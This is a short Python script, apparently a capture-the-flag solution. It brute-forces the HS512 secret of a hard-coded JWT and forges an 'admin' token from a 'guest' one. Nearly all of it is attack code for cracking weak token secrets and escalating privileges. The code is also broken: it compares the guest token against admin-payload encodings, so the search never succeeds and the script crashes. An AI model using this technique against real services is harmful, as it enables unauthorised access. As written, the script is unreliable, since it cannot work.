from itertools import product
import string
import jwt #pip3 install pyjwt
import pyperclip

CHARS = string.ascii_lowercase + string.digits
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"
def guess_password(token, min = 1, max = 5): 
    for passwd_len in range(min, max):
        for passwd in product(CHARS, repeat=passwd_len):
            passwd = ''.join(passwd)
            encoded = jwt.encode({"role":"admin"}, passwd, algorithm='HS512')
            if (encoded == token) :
                return passwd


secret = guess_password(token)          
print("Secret is " + secret)
# token can kiem
rlt = jwt.encode({"role":"admin"}, secret, algorithm='HS512')
print(rlt)
           
pyperclip.copy(rlt)

